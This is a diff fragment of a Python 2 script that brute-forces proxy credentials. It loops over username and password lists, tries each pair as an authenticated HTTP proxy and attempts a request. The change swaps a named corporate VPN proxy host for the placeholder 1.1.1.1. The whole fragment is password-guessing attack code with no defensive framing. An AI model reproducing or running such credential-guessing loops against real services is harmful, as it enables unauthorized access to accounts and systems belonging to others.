@@ -33,7 +33,7 @@ db.commit()
 
 for a in username:
     for j in passwd:
-        proxy = urllib2.ProxyHandler({"http": "http://" + a + ":" + j + "@vpn.baidu.com:3120/"})
+        proxy = urllib2.ProxyHandler({"http": "http://" + a + ":" + j + "@1.1.1.1:3120/"})
         opener = urllib2.build_opener(proxy)
         urllib2.install_opener(opener)
         try:
